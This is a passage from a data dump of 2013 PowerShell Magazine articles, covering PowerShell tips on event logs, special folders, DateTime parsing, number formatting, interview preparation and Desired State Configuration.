Tricks"],"title":"#PSTip How to switch off display with PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nUsing the System.Environment+SpecialFolder enumeration we can retrieve a list of all paths to system special folders. One of the values is: System which holds the path to the Windows system folder.\nPS\u0026gt; [System.Environment]::GetFolderPath('System') C:\\Windows\\system32  On 64-bit machines with .NET Framework 4 installed you will find another value: SystemX86 (there are more x86 items in the SpecialFolder enumeration).\nPS\u0026gt; [Enum]::GetNames('System.Environment+SpecialFolder') | Sort-Object (...) SendTo StartMenu Startup System SystemX86 Templates UserProfile Windows PS\u0026gt; $sysx86 = [System.Environment]::GetFolderPath('SystemX86') PS\u0026gt; $sysx86 C:\\Windows\\SysWOW64 We can use it to construct a path and invoke a 32-bit instance of Windows PowerShell.\nPS\u0026gt; $psx86 = Join-Path -Path $sys86 -ChildPath WindowsPowerShell\\v1.0\\powershell.exe PS\u0026gt; $psx86 C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe PS\u0026gt; Start-Process -FilePath $psx86 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/17/pstip-get-the-path-to-x86-special-folders/","tags":["Tips and Tricks"],"title":"#PSTip Get the path to x86 special folders"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nSince Windows Vista, the operating system is shipped with a ton of additional event logs and providers, some of them are present on the system but are not enabled. For example, you want to enable the Microsoft-Windows-DNS-Client/Operational log. Among other options, logs can be enabled or disabled by using the built-in command line utility, Wevtutil, but this is a PowerShell tip so we’re going to use PowerShell to enable the log file.\nNote that in order to enable the log the code must run from an elevated console or you will get a “Attempted to perform an unauthorized operation.” error. First let’s examine the state of the log file.\nPS\u0026gt; Get-WinEvent -ListLog Microsoft-Windows-DNS-Client/Operational | Format-List * FileSize : IsLogFull : LastAccessTime : LastWriteTime : OldestRecordNumber : RecordCount : LogName : Microsoft-Windows-DNS-Client/Operational LogType : Operational LogIsolation : Application IsEnabled : False IsClassicLog : False SecurityDescriptor : O:BAG:SYD:(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3 ;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573) LogFilePath : %SystemRoot%\\System32\\Winevt\\Logs\\Microsoft-Windows-DNS-Client%4Operational.evtx MaximumSizeInBytes : 1052672 LogMode : Circular OwningProviderName : Microsoft-Windows-DNS-Client ProviderNames : {Microsoft-Windows-DNS-Client} ProviderLevel : ProviderKeywords : ProviderBufferSize : 64 ProviderMinimumNumberOfBuffers : 0 ProviderMaximumNumberOfBuffers : 64 ProviderLatency : 1000 ProviderControlGuid : To enable it we create a new EventLogConfiguration object and pass it the name of the log we want to configure. We enable it and save the changes.\n$logName = 'Microsoft-Windows-DNS-Client/Operational' $log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName $log.IsEnabled=$true $log.SaveChanges() # check the state again PS\u0026gt; Get-WinEvent -ListLog Microsoft-Windows-DNS-Client/Operational | Format-List is* IsLogFull : False IsEnabled : True IsClassicLog : False Using the same method we can configure many other options of the log file, just take a look at the EventLogConfiguration Class for a list of configurable properties.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/15/pstip-how-to-enable-event-logs-using-windows-powershell/","tags":["Tips and Tricks"],"title":"#PSTip How to enable Event logs using Windows PowerShell"},{"categories":["Learning PowerShell"],"contents":"Recently, I was interviewing candidates for a couple of PowerShell automation vacancies. Being a PowerShell enthusiast, I, naturally, focused on understanding how well these candidates understand PowerShell and how well they can solve some problems on the fly. The idea I had in mind when I started these interviews was to select a couple of them with at least beginner level knowledge of PowerShell.\nThis post is a compilation of notes I made during these interviews and some more thoughts on how the candidates or aspirants can prepare themselves better to face a PowerShell interview. This is certainly not a post about the questions you can expect in a PowerShell interview and the answers. If you are a PowerShell novice, you may find this post useful in getting started with PowerShell.\nHere is what I had in my notes.\nUnderstand what Windows PowerShell is! My first question was always “Tell me, what is Windows PowerShell?”\nPowerShell is not just any other shell. PowerShell is an object-based distributed automation engine, scripting language, and command line shell. I don’t expect a beginner to understand every aspect of what I just mentioned but at the least, I expect a candidate to describe the object-based nature of PowerShell. Saying that “PowerShell is object-based because it uses .NET Framework under the covers” is not a very accurate statement. PowerShell is object-based because it deals with objects and not text. Let me show you an example.\nHere is how I get the size of a folder (including its sub-folders and so on) in a DOS batch script:\n@echo off For /F \u0026#34;tokens=*\u0026#34; %%a IN (\u0026#39;\u0026#34;dir /s /-c /a | find \u0026#34;bytes\u0026#34; | find /v \u0026#34;free\u0026#34;\u0026#34;\u0026#39;) do Set xsummary=%%a For /f \u0026#34;tokens=1,2 delims=)\u0026#34; %%a in (\u0026#34;%xsummary%\u0026#34;) do set xfiles=%%a\u0026amp;set xsize=%%b Set xsize=%xsize:bytes=% Set xsize=%xsize: =% Echo Size is: %xsize% Bytes Do you see the pain? How many of you understand what exactly the batch script is doing?\nWell, let us see how we do that in PowerShell.\nGet-ChildItem –Recurse | Measure-Object -Property Length -Sum Simple? At least, it looks simple on the surface. This is made possible because PowerShell deals with objects–the self-describing entities. These objects have properties and one such property on a file object is Length that describes the size of the file in bytes. So, when we add up the size of all files in a folder, we get the size of the folder. If you compare this to the DOS batch example, we are not dealing with any temporary variables or text parsing. We are simply piping the output of Get-ChildItem cmdlet to Measure-Object and summing the value of Length property of each object that passes through the pipeline.\nNow, that is a very simplified version of explaining object-based nature of PowerShell. You can give more such examples as you start using PowerShell.\nAnother observation from these interviews was how the candidates answered questions on properties and methods available on objects. The question was like “get me the value of CPU affinity (without giving the actual property name) of a process“. How do you do that?\nI have seen quite a few doing the following:\n$process = Get-Process -Name notepad So far so good. And, then, they start doing:\n$process.   …  until they reach the required property.\nWell, this certainly gets you the property but what if the property is the 99th one in a set of 100 properties? Not scalable, right? This is where knowing how to use the shell helps you. There is a better way to do that in the shell.\nIf you know the exact property name:\nGet-Process -Name Notepad | Select-Object ProcessorAffinity Or\n$process = Get-Process -Name Notepad $process.ProcessorAffinity If you don’t know the exact property name, don’t keep using Tab! Instead, discover PowerShell. That is the next thing I want to discuss.\nLearn to discover PowerShell One of the most important things for a beginner is to understand how to use the following cmdlets:\n Get-Command Get-Member Get-Help  Get-Command Get-Command gives a list of all commands available in a PowerShell session. One common observation I made during these interviews was the candidates try a non-existent or incorrect cmdlet name and then keep wondering why that was not working. If we know how to discover PowerShell, we can use the Get-Command cmdlet to test if the command we are trying exists or not. For example:\nPS C:\\\u0026gt; Get-Command -Name Get-ComputerName Get-Command : The term \u0026#39;Get-ComputerName\u0026#39; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:1 + Get-Command -Name Get-ComputerName + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (Get-ComputerName:String) [Get-Command], CommandNotFoundException + FullyQualifiedErrorId : CommandNotFoundException,Microsoft.PowerShell.Commands.GetCommandCommand See that? You can also use Get-Command to get commands with a specific noun or verb or even use wildcards to filter.\nGet-Command -Noun Host Get-Command -Verb Write Get-Command N* Get-Member In an earlier paragraph, on using the shell, we saw an example on getting specific properties of an object. But, you can do so only if you know the exact property name. How do we discover what properties and methods are available on an object? Get-Member helps here.\nGet-Process | Get-Member The above command gives all properties, methods, and events of a particular object type. You can filter it further to see the type of member you are interested in.\nGet-Process | Get-Member -MemberType Method Get-Process | Get-Member -MemberType Property Get-Process | Get-Member -MemberType Event Get-Help Another common mistake across the board was the lack of knowledge in using the built-in help. PowerShell built-in cmdlets come with lot of help around how to use the cmdlet. Of course, with PowerShell 3.0 and above, you have to first update this help content using Update-Help cmdlet. When you don’t know the exact syntax of a PowerShell cmdlet, you can always use Get-Help cmdlet. This gives you information about cmdlet parameters, how to use each of those parameters, and provides some examples. When in doubt, you should first check the local help system.\nGet-Help Get-Command Get-Help Get-Member -Detailed Get-Help Get-Process –Examples Get-Help Get-Service –Parameter InputObject Use the shell I don’t expect a beginner to have the knowledge of writing scripts and modules. I look for people who know how to use PowerShell as a shell. For this, you must have really used the built-in cmdlets. This includes simple things like listing the services, processes, files, and folders. If you don’t know how to use Get-ChildItem to perform a recursive search for files, I am sure you wouldn’t have even touched the surface of PowerShell. IMHO, you are not even a beginner.\nWhen learning PowerShell, you should always start at the shell. More or less everything that runs at the PowerShell command prompt, runs as a script too. Start automating simple tasks at the shell using the built-in cmdlets and the PowerShell language. Eventually, you will learn to write scripts. This is one of the most important aspects of getting started with PowerShell.\nI have also heard candidates saying that they know only product-specific PowerShell cmdlets and they can use only those cmdlets. Now, tell me how you would automate a task in PowerShell that configures a product using only product-specific cmdlets without ever using any of the built-in cmdlets or pipeline or PowerShell language. This is not possible. When someone says so, I know that they don’t understand the basics or never used the shell.\nKnow the pipeline For working with PowerShell and to make efficient use of it, you need to understand what pipeline is and how you can combine multiple commands using a pipeline. I showed examples using the pipeline in the above paragraph but did not really explain what it is. Running simple commands is not a difficult task. You will realize the real benefit of PowerShell command line only if you can use the pipeline to combine multiple commands to achieve a bigger task. A complete discussion on pipeline will easily be a 50 – 75 pages of book. Let us keep it simple for the purpose of this article.\nThink of PowerShell pipeline as an assembly line in a manufacturing unit. In a manufacturing unit, components move from one station to another and the final output gets built along the way. The end of the pipeline is where we see the completed product. Similar to this analogy, when we combine multiple PowerShell cmdlets using pipeline, the output of one command becomes an input to the next command in the pipeline. For example:\nGet-Process -Name s* | Where-Object { $_.HandleCount -lt 100 } In the above command, one or more process objects from Get-Process cmdlet is given as an input to the Where-Object cmdlet. The Where-Object cmdlet then filters the object array for the objects with HandleCount property less than 100. You can certainly write something like this without a pipeline too. Let us see how that is done.\n$process = Get-Process -name s* foreach ($proc in $process) { if ($proc.HandleCount -lt 100) { $proc } } As you see, there is more code. While that is not a big deal, you will see a difference in how the output is generated. Related to this, many candidates mentioned that the first command completes execution and all objects move from first command to second. This is not accurate. In case of a pipeline, the objects stream from the first command to the second command as soon they are available.\nThis previous example combines only two commands which may look very trivial. But, think of something like the below example:\nGet-ChildItem -Recurse -Force | Where-Object {$_.Length -gt 10MB} | Sort-Object -Property Length -Descending | Select-Object Name, @{name=\u0026#39;Size (MB)\u0026#39;; expression={$_.Length/1MB}}, Extension | Group-Object -Property extension If you are beginner, I don’t expect you to understand this or write something like this. But, this shows the usefulness of pipeline. The above command (or pipeline of commands) grabs all files that are bigger than 10MB, sorts them by file size in descending order, and groups them by the file extension. Can you try converting this code snippet to achieve the same task without using the pipeline?\nDon’t over-engineer PowerShell, by its very nature, provides more than one way to do things. Of course, not all of these approaches are the same. There are efficient and inefficient ways. There are simple and complicated ways.\nSo, when I ask “get me the name of the computer“, I don’t expect you to write a WMI query.\nGet-WmiObject -Class Win32_ComputerSystem | Select-Object -Property Name or\nGet-WmiObject -Class Win32_OperatingSystem | Select-Object -Property CSName You bet, these commands get you the local computer name. But, understand that there is an easy and better way to do that.\n$env:ComputerName Oh, I got the classic hostname command as an answer as well. Nothing wrong. I use it many times. But, it is a PowerShell interview. Right?\nWrite scripts This has been another constant disappointment. You may know how to run scripts others have written. But, would that make you a scripter? No way. Reading scripts written by others will certainly help you understand the best and worst practices. But, it won’t help you learn if you are a beginner. You learn only when you start writing scripts on your own.\nAlso, don’t tell an interviewer that you wrote advanced functions unless you know how to describe common parameters, parameter types, cmdletbinding, and how Begin, Process, and End blocks work and why they are required. If you don’t understand these concepts, I don’t consider that you have ever written an advanced function in PowerShell. The advanced functions are different from the regular functions we write in PowerShell. When you add CmdletBinding() attribute to a function definition, the basic behavior of a function changes. Why not see an example?\nHere is a regular function that accepts two numbers as an input and returns the sum as output.\nfunction sum { param ( $number1, $number2 ) $number1 + $number2 } PS C:\\\u0026gt; sum 10 30 40 Now, call this function with different number of parameters.\nPS C:\\\u0026gt; sum 10 30 40 40 See that? Although we have only two parameters in the function definition, it accepts three arguments and simply ignores the third argument. Now, add the CmdletBinding() attribute and see how the behavior changes.\nfunction sum { [CmdletBinding()] param ( $number1, $number2 ) $number1 + $number2 } Do the test again with same set of arguments as earlier!\nPS C:\\\u0026gt; sum 10 30 40 PS C:\\\u0026gt; sum 10 30 40 sum : A positional parameter cannot be found that accepts argument \u0026#39;40\u0026#39;. At line:1 char:1 + sum 10 30 40 + CategoryInfo : InvalidArgument: (:) [sum], ParameterBindingException + FullyQualifiedErrorId : PositionalParameterNotFound,sum Got it? The basic behavior of handling input parameters got changed after we added the CmdletBinding() attribute. This is an advanced PowerShell function. But, this is just the beginning. I won’t go into the details of advanced functions here but as an interviewer, I’d expect you to know more if you ever tell me that you wrote advanced functions.\nDon’t depend on search engines One thing I heard from many candidates is that they depend on Google when they want to write a script. They just use a search engine, take the ready-made solution for the problem and use it. This has been a common response before they give up after a few minutes into writing a script or completing a task. I use search engines when I am completely stuck and cannot move forward with what I am doing. Or when I know that someone already had written a script and I don’t want to re-invent the wheel. But, I won’t use this method when my goal is to learn PowerShell. A search engine is the easiest way to find a solution but, you won’t learn anything but how to use search engine. Especially, when you are a beginner, using the ready-made scripts won’t take you anywhere in your learning. And, of course, this is when I generally end the interview! 🙂\nGood luck!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/15/preparing-for-a-powershell-interview/","tags":["Learning PowerShell"],"title":"Preparing for a PowerShell interview!"},{"categories":["News"],"contents":"We are very happy to announce that Tobias Weltner accepted our offer to join PowerShell Magazine’s editorial board. For people in the PowerShell community, Tobias is not an unknown face.\nTobias is a long-term Microsoft’s MVP Award recipient located in Germany. He has written more than 130 IT books published by Microsoft Press and others. As a PowerShell pioneer of the early days, today he focuses on PowerShell trainings, articles and PowerShell-related project work with mid- and large-size enterprises. In April 2013, he initiated and organized the world’s first PowerShell Community Conference in Oberhausen, Germany. He is one of Europe’s leading PowerShell trainers and experts. You can follow him on twitter @TobiasPSP\nWe are excited to have Tobias on the editorial board and we are looking forward to sharing some great PowerShell content from him!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/15/tobias-weltner-joins-powershell-magazine/","tags":["News"],"title":"Tobias Weltner joins PowerShell Magazine"},{"categories":["Tips and Tricks"],"contents":"Say you have a number like: 133903155, how quickly can you digest it? It’s much easier to read when it’s formatted as 133,903,155. One way to convert the number to a readable string is using the -f Format operator:\nPS\u0026gt; $number = 133903155 PS\u0026gt; '{0:N}' -f $number 133,903,155.00  Print the number without precision digits.\nPS\u0026gt; '{0:N0}' -f $number 133,903,155  Under the hood PowerShell is utilizing the String.Format method to format the number (see also Composite Formatting).\nPS\u0026gt; [string]::Format('{0:N0}',$number) 133,903,155  Another way to format numbers would be by using an object’s ToString() method.\nPS\u0026gt; $number.ToString('N0') 133,903,155  Note that the symbol that separates groups of integers is determined by the current culture used on your system (session):\nPS\u0026gt; (Get-Culture).NumberFormat.NumberGroupSeparator , ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/12/pstip-how-to-add-thousands-separators-to-a-number/","tags":["Tips and Tricks"],"title":"#PSTip How to add thousands separators to a number"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nEach time you execute a command in Windows PowerShell, the command is remembered and can be fetched by using the Get-History cmdlet or by using the the up/down arrow keys. One great, less-known, time-saver feature, allows you to quickly cycle through commands using tab completion. For example, to recall the first command containing the string ‘dir’, type the ‘#’ sign followed by the pattern of the command you want to find, and then press the Tab key:\nPS\u0026gt; #dir\u0026lt;TAB\u0026gt; You should now see the expansion of the first command from your history that matches the pattern.\nKeep pressing the TAB key to cycle through all commands that match the specified pattern.\nIf you know the exact command ID you can quickly retrieve it by specifying the ‘#’ sign followed by the ID:\nPS\u0026gt; #11\u0026lt;TAB\u0026gt; ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/11/pstip-using-tab-completion-against-the-command-history/","tags":["Tips and Tricks"],"title":"#PSTip Using Tab completion against the command history"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nOne of the annoyances I’m facing when working with Event logs is navigating and finding a log that is buried a few levels down the logs tree. Starting in Windows 7 we now have a ton of logs on our system. One example is the PowerShell Operational log file. Its path in the console tree is:\nEvent Viewer (Local) + Applications and Services Logs + Microsoft + Windows + PowerShell - Admin - Analytic - Debug - Operational  You get the picture–too many clicks just to get there! And the list of logs is so long that your eyes are starting to lost their way. I was looking for a better and shorter way to launch Event Viewer with a predefined log path specified and hoped it could open right on the log file but I couldn’t find any command line switch to do that.\nFortunately I could find a solution with PowerShell. With the Get-WinEvent cmdlet we can get a list of all event logs, including classic logs (such as the System and Application logs), and the event logs that are generated by the Windows Event Log technology introduced in Windows Vista. We can pass a log name we are interested in and even use wildcards.\nPS\u0026gt; Get-WinEvent -ListLog *PowerShell* LogMode MaximumSizeInBytes RecordCount LogName ------- ------------------ ----------- ------- Circular 15728640 6422 Windows PowerShell Circular 1052672 0 Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/... Retain 1048985600 0 Microsoft-Windows-PowerShell/Admin Circular 15728640 157 Microsoft-Windows-PowerShell/Operational We get back several log files but I’m only interested in the Microsoft-Windows-PowerShell/Operational log file so let’s narrow down the list.\nPS\u0026gt; Get-WinEvent -ListLog *PowerShell/op* LogMode MaximumSizeInBytes RecordCount LogName ------- ------------------ ----------- ------- Circular 15728640 157 Microsoft-Windows-PowerShell/Operational Now that I have the log I want to view I can grab its path on the local file system and try to invoke it:\nPS\u0026gt; $pslog = Get-WinEvent -ListLog *PowerShell/op* PS\u0026gt; $pslog | Format-List log* LogName : Microsoft-Windows-PowerShell/Operational LogType : Operational LogIsolation : Application LogFilePath : %SystemRoot%\\System32\\Winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx LogMode : Circular There’s one problem though, the path starts with a DOS environment variable notation that the Invoke-Item cmdlet doesn’t understand. We can expand it with the ExpandEnvironmentVariables() method:\nPS\u0026gt; [System.Environment]::ExpandEnvironmentVariables($pslog.LogFilePath) C:\\WINDOWS\\System32\\Winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx  Great, now let’s invoke the path and see what happens.\n$pslog = Get-WinEvent -ListLog *PowerShell/op* $path = [System.Environment]::ExpandEnvironmentVariables($pslog.LogFilePath) Invoke-Item -Path $path  Excellent, right on the money! The log file is loaded and presented when Event Viewer is opened, no need to embark on a clicking adventure.\nThe log file was loaded under the Saved Logs folder in the Event Viewer console tree. From now on each time you open the Event Viewer, the PowerShell log file will be listed under that folder. When Event Viewer is launched it knows which files to add to the Saved Logs list by looking for XML files at a specific location on the file system. Saved Logs are saved under the C:\\ProgramData system folder (hidden by default) as XML files.\nTo clear the list, delete the files found under that path. I’ve found that if you remove the logs via the Action menu/pane, you are removing it from the console tree and the only way to reopen the log is via Open Saved log option.\nGet-ChildItem \"$env:ProgramData\\Microsoft\\Event Viewer\\ExternalLogs\" -Filter *.xml | Remove-Item -Force  Before you remove them make sure to close the Event Viewer otherwise the files will be created again when Event Viewer is closed. Note that you must run this from an elevated session or you will get an access denied error.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/10/pstip-a-faster-way-to-open-specific-event-logs/","tags":["Tips and Tricks"],"title":"#PSTip A Faster way to open specific Event Logs"},{"categories":["Tips and Tricks"],"contents":"You want to be able to check and allow only date and time strings that are in a specific date time format pattern. For example, you get a string and want to check if it is in a sortable date and time pattern.\nLet’s find first how a sortable date and time string looks like. Note that format string is culture dependent:\nPS\u0026gt; (Get-Culture).DateTimeFormat.SortableDateTimePattern yyyy'-'MM'-'dd'T'HH':'mm':'ss  Instead of using, or having to remember that long pattern, the .NET Framework offers us a composite format string\nthat is an equivalent of the above, kind of a shortcut pattern, the “s” standard format string. We can format a date and time object to a sortable pattern with the Get-Date cmdlet.\nPS\u0026gt; Get-Date -Format s 2013-07-05T11:45:10  Now, given a date and time string, how you check it complies to a specific pattern?\nThe DateTime .NET structure has a static method we can use to parse strings and return DateTime objects, the ParseExact method. It converts the specified string representation of a date and time to its DateTime equivalent. If the format of the string does not match a specified format exactly an exception is thrown.\nThe method accepts three arguments:\n  s – A string that contains a date and time to convert. format – A format specifier that defines the required format of ‘s’. provider – An object that supplies culture-specific format information about ‘s’.  Wrapping it all into a function so we can reuse it any time we need to.\nfunction Test-DateTimePattern { param( [string]$String, [string]$Pattern, [System.Globalization.CultureInfo]$Culture = (Get-Culture), [switch]$PassThru ) $result = try{ [DateTime]::ParseExact($String,$Pattern,$Culture) } catch{} if($PassThru -and $result) { $result } else { [bool]$result } }  The function returns True/False if a given string is in the correct format. Add the PassThru switch to get back the parsed date and time object if the pattern was successfully parsed.\nPS\u0026gt; Test-DateTimePattern -String '12:15 PM' -Pattern t True # invalid pattern, missing the AM/PM designator (try Get-Date -f g) PS\u0026gt; Test-DateTimePattern -String '7/5/2013 12:16' -Pattern g False PS\u0026gt; Test-DateTimePattern -String '2013-07-05T11:45:12' -Pattern s -PassThru Friday, July 5, 2013 11:45:12 AM # invalid pattern, pattern should be in dd/MM/yyyy PS\u0026gt; Test-DateTimePattern -String '12/14/2013' -Pattern d -Culture he-IL False ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/09/pstip-how-to-check-if-a-datetime-string-is-in-a-specific-pattern/","tags":["Tips and Tricks"],"title":"#PSTip How to check if a DateTime string is in a specific pattern"},{"categories":["Tips and Tricks"],"contents":"In a perfect world all date and time data available are represented by System.DateTime objects. In the real world we are usually not that lucky. You get lot of obscurely formatted dates that you have to convert yourself. The .NET Framework offers a special method just for that, TryParseExact(). Calling the method is not particularly easy so I’ve created a short function to make it easier to work with:\nfunction Convert-DateString ([String]$Date, [String[]]$Format) { $result = New-Object DateTime $convertible = [DateTime]::TryParseExact( $Date, $Format, [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::None, [ref]$result) if ($convertible) { $result } }  Let’s call it with a date string in an uncommon format and see how the function handles different date and time separators:\nConvert-DateString -Date '12/10\\2013 13:26-34' -Format 'dd/MM\\\\yyyy HH:mm-ss' Saturday, October 12, 2013 1:26:34 PM  The function successfully converts the date and returns a DateTime object. If the operation was not successful nothing would have been returned.\nAlso notice the Format parameter accepts array of strings, allowing you to specify more than one format of the input.\nConvert-DateString -Date '12:26:34' -Format 'HH:mm:ss','HH-mm-ss' Convert-DateString -Date '12-26-34' -Format 'HH:mm:ss','HH-mm-ss' Thursday, July 4, 2013 12:26:34 PM Thursday, July 4, 2013 12:26:34 PM The string is converted successfully, and because only time was provided, today’s date is used to complete the other date parts of the object.\nBuilding a format string Providing correct string to the Format parameter is essential for successfully using the function. Let’s have a quick look on how to create one yourself: The string uses the following characters “d”, “f”, “F”, “g”, “h”, “H”, “K”, “m”, “M”, “s”, “t”, “y”, “z” to define type, position and format of the input values. The type of the input value (day, month, minute etc.) is defined by choosing the correct letter to represent the value (day d, month M, minute m etc.), case matters here. The position is defined by placing the character on the correct place in the string. The format is defined by how many times the character is repeated (d to represent 1-31, dd for 01-31, dddd for Monday).\nConvert-DateString -Date 'Thursday, July 4, 2013 12:26:34 PM' ` -Format 'dddd, MMMM d, yyyy hh:mm:ss tt' Thursday, July 4, 2013 12:26:34 PM If your string contains any of the listed characters or the backslash (“\\”) character you have to escape it by preceding it with a backslash:\nConvert-DateString -Date \u0026quot;d: 01\u0026amp;#92;\u0026amp;#48;1\\2013\u0026quot; -Format '\\d: dd\\\\MM\\\\yyyy' Tuesday, January 1, 2013 12:00:00 AM The complete reference to creating custom date and time format strings, as well as many examples may be found here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/08/pstip-converting-a-string-to-a-system-datetime-object/","tags":["Tips and Tricks"],"title":"#PSTip Converting a String to a System.DateTime object"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nOne of the new features introduced in PowerShell 4.0 is the collection filtering by using a method syntax. You can now filter a collection of objects using a simplified Where-Object like syntax specified as a method call.\nPS\u0026gt; (Get-Process).where(\u0026quot;name -like p*\u0026quot;) Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 465 30 86396 100996 624 2.56 9524 powershell 893 91 346044 382620 1050 515.21 9736 powershell_ise Awesome! Now, if you open PowerShell and try this out you’ll probably get the following error:\nPS \u0026gt; (Get-Process).where(\"name -like p*\") Method invocation failed because [System.Diagnostics.Process] does not contain a method named 'where'. At line:1 char:1 + (gps).where(\"name -like p*\") + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (:) [], RuntimeException + FullyQualifiedErrorId : MethodNotFound  What happened? Collection filtering is a part of the PSDesiredStateConfiguration module and to have it available you first need to import the module.\nPS\u0026gt; Import-Module PSDesiredStateConfiguration PS\u0026gt; (Get-Process).where(\u0026quot;name -like p*\u0026quot;) Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 709 66 138168 163976 744 5.24 7120 powershell 893 91 346044 382620 1050 515.21 9736 powershell_ise # now let's examine the method signature: PS\u0026gt; (Get-Process).where Script : $prop, $psop, $val = [string] $args[0] -split '( -eq|-ne|-gt|-ge|-lt|-le|-like|-notlike|-match|-notmatch)' $operation = @{ Prop = $prop.Trim(); Value = $val.Trim(); $psop = $true } $this | where @operation OverloadDefinitions : {System.Object where();} MemberType : ScriptMethod TypeNameOfValue : System.Object Value : System.Object where(); Name : where IsInstance : False As you can see the where method is actually a ScriptMethod, and if you open the PSDesiredStateConfiguration psm1 file you’ll find the command that extends the System.Array type using the Update-TypeData cmdlet (line 849).\nUpdate-TypeData -Force -MemberType ScriptMethod -MemberName where -TypeName System.Array -Value { $prop, $psop, $val = [string] $args[0] -split '(-eq|-ne|-gt|-ge|-lt|-le|-like|-notlike|-match|-notmatch)' $operation = @{ Prop = $prop.Trim(); Value = $val.Trim(); $psop = $true } $this | where @operation }  Having to load the module each time you want to use the method is not that convenient so why not adding it to every PowerShell session you open. Add the above command to your profile and you’re good to go.\nwhere() method is not limited to PowerShell 4.0 only. Simplified syntax was introduced in PowerShell 3.0 so you can enable this on systems with that version as well.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/05/pstip-powershell-4-filtering-a-collection-by-using-a-method-syntax/","tags":["Tips and Tricks"],"title":"#PSTip PowerShell 4 – Filtering a collection by using a method syntax"},{"categories":["PowerShell DSC"],"contents":"The big news, for the PowerShell enthusiasts, from TechEd NA 2013 was the Desired State Configuration (DSC) feature announcement. DSC can be used to streamline configuration changes in a datacenter environment and in a consistent manner. This feature is built right into the core OS so that not just PowerShell but other ISVs and management software can also leverage the underlying management model.\nIf you have heard Jeffrey Snover and Kenneth Hansen speak about this topic at TechEd, they mentioned, quite a few times, declarative syntax that they have blended with the imperative nature of Windows PowerShell. For an IT professional with no development background, someone like me for example, this terminology isn’t very familiar. To appreciate the real benefits of a feature like DSC and the way it is implemented, we need to first understand the differences between declarative and imperative scripting practices. And, that is the essence of this article. Of course, I will use PowerShell to showcase the difference.\nMake a note that this article is not about whether declarative syntax is good or bad. Instead, this article is going to introduce what declarative and imperative syntax are.\nLet us first look at imperative style of programming/scripting and start with an example to understand this better.\nImport-Module ServerManager #Check and install ASP.NET 4.5 feature If (-not (Get-WindowsFeature \u0026quot;Web-Asp-Net45\u0026quot;).Installed) { try { Add-WindowsFeature Web-Asp-Net45 } catch { Write-Error $_ } } #Check and install Web Server Feature If (-not (Get-WindowsFeature \u0026quot;Web-Server\u0026quot;).Installed) { try { Add-WindowsFeature Web-Server } catch { Write-Error $_ } } #Create a new website Add-PSSnapin WebAdministration New-WebSite -Name MyWebSite -Port 80 -HostHeader MyWebSite -PhysicalPath \u0026quot;$env:systemdrive\\inetpub\\MyWebSite\u0026quot; #Start the website Start-WebSite -Name MyWebSite If you look at the above example, we are telling PowerShell how to perform what we need to perform. The emphasis here is on how we perform a task and in the process we achieve what we need to. This is called the imperative programming/scripting style and is what we write everyday in PowerShell. We need to explicitly code how to verify the task dependencies and how the exceptions need to be handled. Going back to our example, I am explicitly checking if ASP.Net 4.5 and Web Server features are installed or not and then install them if they are not present.\nEnter PowerShell 4.0 and the Desired State Configuration feature. The Windows PowerShell team has chosen to implement declarative programming style for DSC:\nConfiguration WebSiteConfig { Node MyWebServer { WindowsFeature IIS { Ensure = \u0026quot;Present\u0026quot; Name = \u0026quot;Web-Server\u0026quot; } WindowsFeature ASP { Ensure = \u0026quot;Present\u0026quot; Name = \u0026quot;Web-Asp-Net45\u0026quot; } Website MyWebSite { Ensure = \u0026quot;Present\u0026quot; Name = \u0026quot;MyWebSite\u0026quot; PhysicalPath = \u0026quot;C:\\Inetpub\\MyWebSite\u0026quot; State = \u0026quot;Started\u0026quot; Protocol = @(\u0026quot;http\u0026quot;) BindingInfo = @(\u0026quot;*:80:\u0026quot;) } } }  Observe the above example. We are more or less doing the same job–as in imperative style example–in this code snippet. That is, checking if ASP.Net 4.5 and Web Server features are installed and then create a website. Within the DSC code snippet, we are specifying what needs to be done and not how it needs to be done. In the declarative programming style, we are not concerned about how things are done. We depend on the underlying automation or programming framework to know how to perform a given set of tasks. Of course, there has to be explicit support within the underlying framework to perform these tasks. This is what DSC resources enable. The declarative programming style is more readable and easy to understand.\nTo summarize, the imperative 